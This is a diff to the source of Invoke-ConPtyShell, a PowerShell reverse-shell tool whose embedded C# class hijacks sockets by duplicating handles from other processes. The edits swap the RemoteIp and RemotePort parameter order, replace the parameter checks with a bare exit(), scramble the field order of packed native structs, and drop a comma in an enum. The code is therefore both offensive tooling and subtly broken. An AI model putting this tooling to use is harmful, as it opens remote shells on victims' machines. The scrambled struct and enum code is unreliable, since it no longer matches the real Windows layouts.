@@ -69,11 +69,11 @@ function Invoke-ConPtyShell
     #>
     Param
     (
-        [Parameter(Position = 0)]
+        [Parameter(Position = 1)]
         [String]
         $RemoteIp,
         
-        [Parameter(Position = 1)]
+        [Parameter(Position = 0)]
         [String]
         $RemotePort,
 
@@ -100,13 +100,7 @@ function Invoke-ConPtyShell
     }
     else{
   
-        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
-            throw "RemoteIp missing parameter"
-        }
-        
-        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
-            throw "RemotePort missing parameter"
-        }
+        exit()
     }
     $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
     Add-Type -TypeDefinition $Source -Language CSharp;
@@ -168,6 +162,9 @@ public class DeadlockCheckHelper
 }
 public static class SocketHijacking
 {
+    private const int SG_UNCONSTRAINED_GROUP = 0x1;
+    private const int SG_CONSTRAINED_GROUP = 0x2;
+    private const uint IOCTL_AFD_GET_CONTEXT = 0x12043;
     private const uint NTSTATUS_SUCCESS = 0x00000000;
     private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;
     private const uint NTSTATUS_BUFFEROVERFLOW = 0x80000005;
@@ -178,9 +175,6 @@ public static class SocketHijacking
     private const int SystemHandleInformation = 16;
     private const int PROCESS_DUP_HANDLE = 0x0040;
     private const int SIO_TCP_INFO = unchecked((int)0xD8000027);
-    private const int SG_UNCONSTRAINED_GROUP = 0x1;
-    private const int SG_CONSTRAINED_GROUP = 0x2;
-    private const uint IOCTL_AFD_GET_CONTEXT = 0x12043;
     private const int EVENT_ALL_ACCESS = 0x1f0003;
     private const int SynchronizationEvent = 1;
     private const UInt32 INFINITE = 0xFFFFFFFF;
@@ -199,31 +193,31 @@ public static class SocketHijacking
         GroupTypeUnconstrained = SG_UNCONSTRAINED_GROUP
     }
     public enum OBJECT_INFORMATION_CLASS : int
-    {
-        ObjectBasicInformation = 0,
+    {   
         ObjectNameInformation = 1,
-        ObjectTypeInformation = 2,
-        ObjectAllTypesInformation = 3,
+        ObjectBasicInformation = 0,
         ObjectHandleInformation = 4
+        ObjectAllTypesInformation = 3,
+        ObjectTypeInformation = 2,
     }
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
     {
+        public IntPtr GrantedAccess;
         public ushort UniqueProcessId;
         public ushort CreatorBackTraceIndex;
-        public byte ObjectTypeIndex;
+        public IntPtr Object;
         public byte HandleAttributes;
         public ushort HandleValue;
-        public IntPtr Object;
-        public IntPtr GrantedAccess;
+        public byte ObjectTypeIndex;
     }
     [StructLayout(LayoutKind.Sequential)]
     private struct GENERIC_MAPPING
     {
-        public int GenericRead;
-        public int GenericWrite;
         public int GenericExecute;
+        public int GenericWrite;
         public int GenericAll;
+        public int GenericRead;  
     }
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     private struct OBJECT_TYPE_INFORMATION_V2
@@ -235,8 +229,8 @@ public static class SocketHijacking
         public uint TotalNonPagedPoolUsage;
         public uint TotalNamePoolUsage;
         public uint TotalHandleTableUsage;
-        public uint HighWaterNumberOfObjects;// PeakObjectCount;
-        public uint HighWaterNumberOfHandles;// PeakHandleCount;
+        public uint HighWaterNumberOfObjects;
+        public uint HighWaterNumberOfHandles;
         public uint HighWaterPagedPoolUsage;
         public uint HighWaterNonPagedPoolUsage;
         public uint HighWaterNamePoolUsage;
@@ -244,13 +238,13 @@ public static class SocketHijacking
         public uint InvalidAttributes;
         public GENERIC_MAPPING GenericMapping;
         public uint ValidAccessMask;
-        public byte SecurityRequired;//bool
-        public byte MaintainHandleCount;//bool
+        public byte SecurityRequired;
+        public byte MaintainHandleCount;
         public byte TypeIndex;
         public byte ReservedByte;
         public uint PoolType;
-        public uint DefaultPagedPoolCharge;// PagedPoolUsage;
-        public uint DefaultNonPagedPoolCharge;//NonPagedPoolUsage;
+        public uint DefaultPagedPoolCharge;
+        public uint DefaultNonPagedPoolCharge;
     }
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     private struct OBJECT_NAME_INFORMATION
